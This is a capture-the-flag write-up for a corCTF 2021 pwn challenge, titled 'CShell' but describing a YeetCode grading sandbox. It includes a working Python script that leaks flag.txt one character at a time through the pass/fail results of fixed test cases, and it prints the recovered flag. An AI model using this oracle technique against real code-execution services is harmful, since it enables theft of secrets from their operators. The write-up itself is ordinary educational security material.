# CShell - corCTF 2021

- Category: Pwn
- Points: 459
- Solves: 81
- Solved by: drw0if - hdesk

## Description

Brush up on your coding skills and ace your next interview with YeetCode! Flag is at ./flag.txt

[https://yeetcode.be.ax](https://yeetcode.be.ax)

## Solution

Opening the link we can see a text area in which we can write some Python code that is send to the backend that return a score of test cases passed.

So, most probably the code is executed in a sandbox.

Analizing the [source code](yeetcode.tar.xz) that was given in the challenge we can see that we were right, the code is executed in a `epicbox` sandbox:

```python
...

files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
limits = {'cputime': 1, 'memory': 16}
result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)

...
```

With the file `code.py` that contains our code, we have a file named `flag.txt` that looks intresting.

From the source code we can se also that 2 of the 10 test cases are fixed:

```python
...

tests = [(2, 3, 5), (5, 7, 12)]
for _ in range(8):
    a, b = random.randint(1, 100), random.randint(1, 100)
    tests.append((a, b, a + b))

...
```

So, we can try to exfiltrate the flag character by character using the first test case with the following code:

```python
def f(a,b):
    char = ord(open('flag.txt', 'r').read()[§1§])
    return char - §2§ if a==2 and b==3 else -1
```

Where:
- `§1§`: position of the character tha we want;
- `§2§`: decimal value (minus 5) of the character with which we want to compare it.

If the result returned contains `"p": "1"` we find the character.

Now, the only thing to do is to iterate the process until we find the character `}`:

```python
import requests
from string import ascii_lowercase, digits

chars = ascii_lowercase + digits + '_-{}'
flag = ""

def send_req(index, rem):
    return requests.post('https://yeetcode.be.ax/yeetyeet', data="def f(a,b):\n\tchar=ord(open('flag.txt', 'r').read()[" + str(index) + "])\n\treturn char-" + str(rem) + " if a==2 and b==3 else -1").json()

x = len(flag)
while True:
    for i in chars:
        res = send_req(x, ord(i)-5)
        if(res['p'] == 1):
            flag += i
            print(flag)
            x += 1
            if flag[-1] == '}':
                exit
            break
```

**P.S.** This process is very slow, it can be optimized using together the first two test case and check two character at the same time.

## Flag

```
corctf{1m4g1n3_cp_g0lf_6a318dfe}
```